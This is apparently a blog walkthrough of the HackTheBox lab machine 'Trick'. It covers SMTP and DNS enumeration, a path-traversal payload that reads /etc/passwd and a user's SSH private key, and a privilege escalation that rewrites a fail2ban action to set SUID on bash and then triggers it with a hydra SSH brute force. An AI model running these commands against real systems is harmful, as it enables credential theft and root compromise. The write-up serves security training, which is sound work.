---
title: HTB | Trick
author: Zeropio
date: 2022-08-28
categories: [Pentesting, HackTheBox]
tags: [htb, linux, easy, machines]
permalink: /pentesting/htb/machines/trick
---

![HTB Img](/assets/img/hackthebox/card/Trick.png)


# Enumeration

After the nmap we found a web and a SMTP server:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## SMTP - Port 25

Going back to the SMTP server, we can connect with telnet as:

```console
zero@pio$ telnet 10.10.11.166 25
```

We succesfully connect. We can try if we can enumerate users with the **VRFY** command (same with **HELO**):

```
220 debian.localdomain ESMTP Postfix (Debian/GNU)
252 2.0.0 root
VRFY aaaaaaaa
550 5.1.1 <aaaaaaaa>: Recipient address rejected: User unknown in local recipient table
```

We try with a possible valid user and see that is valid. Sometimes all the response seems to be valid, so we try with a non-existing user and see that it got rejected. We can use now **smtp-user-enum** with the **Seclists** to get some valid users:

```console
zero@pio$ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.11.166 -w 15
```

After executing the command we got 0 valid users, even though we know that the user **root** is a valid one. We add a timeout of 15 seconds with `-w 15` and get now two valid users with this wordlist:

```
10.10.11.166: root exists
10.10.11.166: mysql exists
```

Let’s try if the domain from the nmap is a valid one in the telnet:

```
VRFY root@debian.localdomain
252 2.0.0 root@debian.localdomain
VRFY root@asdasd.asdas
454 4.7.1 <root@asdasd.asdas>: Relay access denied
```

So we know that this is the syntax of the emails.

We can try to authenticate, getting errors with IMAP and POP3 authentication:

```
1 LOGIN root root
502 5.5.2 Error: command not recognized
USER root
502 5.5.2 Error: command not recognized
```

If we can try to `hydra` we confirm that we cannot authenticate here:

```console
zero@pio$ hydra -L valid_users -P /usr/share/wordlists/rockyou.txt -f 10.10.11.166

...
[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 5.5.1 Error: authentication not enabled
```

## DNS - Port 53

We would try some `dig` with the information aviable from the nmap, without success:

```console
zero@pio$ dig A debian.localdomain @10.10.11.166

zero@pio$ dig axfr debian.localdomain @10.10.11.166

zero@pio$ dig axfr 10.10.11.166 @10.10.11.166
```

But if we use the domain **trick.htb**:

```console
dig axfr trick.htb @10.10.11.166

; <<>> DiG 9.18.4-2-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 196 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Sun Aug 28 11:14:05 BST 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

We found the subdomain **prepod-payroll**. Let’s add it to the hosts file. We have here a login.

![Untitled](/assets/img/hackthebox/labs/trick/Untitled.png)

We cannot enumerate users there, providing bad credentials give an **Username or password is incorrect** error. 

We can try finding more subdomains fuzzing. Tools like `dnsrecon` doesn’t find anything. We can try with `wfuzz` to fuzz in the headers. This as well doesn’t provide anything. We can try using the same syntax as the founded subdomain:

```console
zero@pio$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.166 -H 'Host: preprod-FUZZ.trick.htb' --hh 5480

000000254:   200        178 L    631 W      9660 Ch     "marketing"
```

We found a new subdomain, and here a new web:

![Untitled](/assets/img/hackthebox/labs/trick/Untitled%201.png)

If we move between pages we found that the URL is as: [`http://preprod-marketing.trick.htb/index.php?page=about.html`](http://preprod-marketing.trick.htb/index.php?page=about.html) .

## Nginx - Port 80

The web ask for a valid email (just the format). Inspecting the source code we couldn’t find any link to another web. We also found a domain, **debian.localdomain**, but adding it to the `/etc/hosts` {: .filepath} doesn’t provide any new web.

![Untitled](/assets/img/hackthebox/labs/trick/Untitled%202.png)

We can found in the source code a path to the background mp4. If we go one step back in `/assets/mp4/` {: .filepath} we got a **403 error.**

# Foothold

In the **preprod-marketing** subdomain we can use the `dotdotpwn` to test for path traversal:

```console
zero@pio$ dotdotpwn -m http-url -u http://preprod-marketing.trick.htb/index.php?page=TRAVERSAL -M GET -k root

```

Using the following payload `..././..././..././etc/passwd` we can read the file. Searching for users we found the **michael** user with a shell. Let’s try finding it a RSA with `..././..././..././home/michael/.ssh/id_rsa` . And we got it. Connect now to the machine with it.

Call the web with a curl to get the RSA in a good format and connect to it:

```console
zero@pio$ curl 'http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa'
```

# Privilege Escalation

After getting the shell we can check the kernel version:

```console
-bash-5.0$ uname -a
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/
```

We see that is a vulnerable version, the CVE-2021-4043, pwnkit. If we check our sudo permission we can see that we can restart the **fail2ban** service:

```console
-bash-5.0$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

We will go to the path of the program, in `/etc/fail2ban/action.d/` {: .filepath}. We can’t write the config file, but we can remove it and create a new one with the following commands:

```console
-bash-5.0$ sed "s/<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>/chmod u+s \/bin\/bash/g" /etc/fail2ban/action.d/iptables-multiport.conf > config.conf
-bash-5.0$ rm -f /etc/fail2ban/action.d/iptables-multiport.conf
-bash-5.0$ mv config.conf /etc/fail2ban/action.d/iptables-multiport.conf
-bash-5.0$ sudo /etc/init.d/fail2ban restart
```

Start a bruteforcing to the ssh to get the **fail2ban** start:

```console
zero@pio$ hydra 10.10.11.166 ssh -l root -P /usr/share/wordlists/rockyou.txt
```

And after a few seconds execute bash and we should be root:

```console
-bash-5.0$ bash -p
bash-5.0# whoami
root
```
